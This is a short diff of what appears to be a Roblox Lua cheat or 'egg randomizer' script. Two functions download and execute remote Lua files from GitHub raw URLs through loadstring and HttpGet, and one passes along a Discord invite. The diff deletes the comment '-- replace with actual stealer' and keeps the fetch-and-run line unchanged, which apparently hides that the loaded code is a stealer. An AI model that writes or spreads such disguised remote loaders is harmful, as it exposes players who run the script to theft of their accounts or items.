@@ -1,4 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp'))() -- replace with actual stealer
+loadstring(game:HttpGet('https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp'))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
